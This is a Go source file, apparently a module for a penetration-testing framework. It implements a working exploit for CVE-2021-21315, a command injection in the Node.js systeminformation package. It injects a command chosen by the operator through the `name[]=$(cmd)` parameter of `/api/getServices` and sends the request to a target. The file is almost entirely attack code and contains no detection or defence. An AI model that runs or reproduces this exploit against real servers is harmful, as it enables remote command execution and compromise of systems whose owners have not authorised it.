package exp_nodejs

import (
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"net/url"
	"strings"
)

type Exp_CVE_2021_21315 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_CVE_2021_21315) Attack_cmd1() (expResult exp_model.ExpResult) {

	headers := self.GetInitExpHeaders() //获取header
	//headers.Set("Content-Type", "application/json") //设置格式
	//设置poc
	payload := `/api/getServices?name[]=$(cmd)`
	//替换poc
	payload = strings.Replace(payload, "cmd", url.PathEscape(self.MustGetStringParam("cmd")), 1)
	//发送请求
	httpResp := self.HttpGet(goutils.AppendUri(self.Params.BaseParam.Target, payload), headers)
	if httpResp.Err != nil {
		expResult.Err = httpResp.Err.Error()
		self.EchoSuccessMsg("执行失败，请检查命令执行结果！")
		return
	}
	self.EchoSuccessMsg("执行成功，请检查命令执行结果！")
	return expResult

}

func init() {
	exp_register.ExpStructRegister(&Exp_CVE_2021_21315{}, "exp_cve_2021_21315.yml")

}
